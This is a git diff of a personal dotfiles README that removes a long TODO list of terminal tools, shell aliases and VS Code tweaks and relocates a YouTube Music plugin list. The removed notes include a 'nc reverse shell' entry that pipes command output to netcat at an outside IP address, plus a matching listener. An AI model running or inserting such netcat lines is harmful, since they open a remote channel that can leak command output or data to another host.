@@ -171,101 +171,9 @@ hatch run true
     - Enable webview inspecting
 - Steam
   - Top left steam logo > Settings > Compatibility > Enable steam play for all titles
-- YtMusic
-  - adblocker
-  - blur-nav-bar
-  - lyrics-genius
-  - navigation
-  - picture-in-picture
-  - precise-volume
-  - shortcuts
-  - sponsorblock
-  - video-toggle
 
 ### TODO
 
-- TUI
-  - new software
-    - zsh or fish (or bash lol)
-    - nmap to rustscan
-    - [dive](https://github.com/wagoodman/dive)
-    - [Mosh: the mobile shell](https://mosh.org/)
-    - <https://github.com/pojntfx/octarchive>
-    - [yassinebridi/serpl: A simple terminal UI for search and replace, ala VS Code.](https://github.com/yassinebridi/serpl)
-  - alias
-    - grep config folder for cheatsheet
-    - code=co
-    - clear=cl
-    - dcu not pull
-    - dcup prod
-    - set-alias -name pn -value pnpm
-    - wsl `find / -not -path '/mnt/*'`
-    - `find / -not -path '/mnt/*' -name python -not -path '/home/*'`
-    - git config core.editor=code -w -n
-    - nc reverse shell
-      - exec command 2>&1 | nc 176.117.72.208 12345
-      - nc -l -p 12345 2>&1 | tee -a keklol
-    - fzc alias=fzf ~/config
-    - nv show .files
-    - nvf current dir or sudo or ignore /proc etc
-    - llt ls tree
-      - or lll
-    - uv run --python 3.13t -- python
-    - py
-    - docker compose fzf command
-    - alias ip='ip --color=auto'
-    - proto outdated --update
-  - starship
-    - sudo session time
-    - remove versions
-    - dynamic battery icon
-  - bat
-    - [zsh '--help' alias](https://github.com/sharkdp/bat#highlighting---help-messages)
-  - .editorconfig conf
-    - make it global ?
-- GUI
-  - new software
-    - <https://github.com/th-ch/youtube-music/releases/latest>
-      - scoop install youtube-music
-    - <https://github.com/omegaui/cliptopia>
-    - <https://github.com/Martichou/rquickshare>
-    - [Install Varia on Linux | Flathub](https://flathub.org/apps/io.github.giantpinkrobots.varia)
-  - move badapple gif and mp3 outsude of git (or genereate them idk)
-  - vscode
-    - export configs
-      - layout
-      - extensions
-      - profiles
-    - color logs
-    - python -File activate envs
-    - pycharm like run file
-    - "python.analysis.autoImportCompletions": true
-    - git tree view by default
-    - ctrl+shift++ in terminal
-    -
-    - [test open](vscode://file/D:\sync\notes)
-    - restart extension hosts workaround for copilot
-    - debug inside python container
-    - disable parenthesis when apply auto-import
-    - PR settings.openFilesInProfile
-    - remove/sort plugins
-      - use profiles
-        - make own profiles system with minimal overhead
-          - nixos?
-    - windows tab in terminal WTF
-    -
-      - compound logs check
-      - cssho.vscode-svgviewer is needed?
-      - jock.svg is needed?
-    - shift+enter WTF
-    - <https://code.visualstudio.com/docs/copilot/copilot-customization#_reusable-prompt-files-experimental>
-    - <https://code.visualstudio.com/docs/copilot/copilot-customization>
-    - <https://code.visualstudio.com/updates/v1_98#_task-rerun-action>
-  - obs
-    - quick replay (import scenes)
-    - battery-based auto-replay
-  - find browser sync bookmarks and history tool
-  - mpv screenshots folder
 - meta
   - Syncthing Tray/service setup info (isn't declarative)
   - learn
@@ -281,6 +189,16 @@ hatch run true
     - Settings Sync
     - Serminal | pwsh.exe -NoLogo
     - File > Settings > Appearance & Behavior > File Colors >> Non-Project Files -> Use in editor tabs
+  - YtMusic
+    - adblocker
+    - blur-nav-bar
+    - lyrics-genius
+    - navigation
+    - picture-in-picture
+    - precise-volume
+    - shortcuts
+    - sponsorblock
+    - video-toggle
   - IOS dualboot
     - <https://github.com/MatthewPierson/Divise>
     - <https://www.youtube.com/watch?v=_owhlPukE_A>
